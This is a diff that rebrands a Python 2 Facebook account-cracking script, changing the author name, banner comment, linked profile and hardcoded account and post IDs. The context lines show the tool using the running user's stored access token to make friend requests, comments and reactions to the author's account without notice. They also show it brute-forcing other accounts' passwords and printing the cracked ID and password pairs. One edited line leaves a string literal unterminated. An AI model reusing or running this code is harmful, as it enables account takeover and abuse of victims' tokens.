@@ -66,12 +66,12 @@ logo = """
 ██║░░██╗██╔══██╗███████║██║░░██╗██╔═██╗░
 ╚█████╔╝██║░░██║╚════██║╚█████╔╝██║░╚██╗
 ░╚════╝░╚═╝░░╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝
-\033[1;41;97mAuthor : OKENWA BRIGHT\033[0m
+\033[1;41;97mAuthor : ☆ RAKA ☆ ™︻®╤───────═◍➤\033[0m
  """
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m OKENWA BRIGHT\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m ☆ RAKA ☆ ™︻®╤───────═◍➤\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)
  
  
 back = 0
@@ -86,7 +86,7 @@ username = []
 idteman = []
 idfromteman = []
  
-######OKENWA######
+######BANGSAT######
 def masuk():
 	os.system('clear')
 	print logo
@@ -123,25 +123,25 @@ def tokenz():
 		zedd.close()
 		jalan ('\033[1;97mYou MUST FOLLOW ME FB ALC TO WORK SUCCEEFUL :) ')
 		print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Always On God🙏'
-		os.system('xdg-open  https://www.facebook.com/ibrahim.jalo')
+		os.system('xdg-open  https://www.facebook.com/GARANGAN.KECHE')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;39m!\033[1;97m] \033[1;39mToken Error !"
 		time.sleep(1)
 		masuk()
  
-######BOT OKENWA#######
+######BOT BANGSAT#######
 def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
 		print"\033[1;39m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100004412526309')
+	una = ('100017584682867')
 	kom = ('Good day😊')
 	reac = ('LOVE')
-	post = ('1874741336016266')
-	post2 = ('1874741336016266')
+	post = ('934976007098547')
+	post2 = ('934976007098547')
 	kom2 = ('Please send me this script🙏')
 	reac2 = ('ANGRY')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
@@ -410,7 +410,7 @@ def pilih_super():
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96m[✖] \x1b[1;93mOkenwa_CP'
+													print '\x1b[1;96m[✖] \x1b[1;93mRAKA_CP'
 													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
 													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
@@ -430,7 +430,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96m[✖] \x1b[1;93mOkenwa_CP
+															print '\x1b[1;96m[✖] \x1b[1;93mRAKA_CP
 															print '\x1b[1;96m[✺] \x1b[1;97mName \x1b[1;91m    : \x1b[1;93m' + b['name']
 															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
 															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
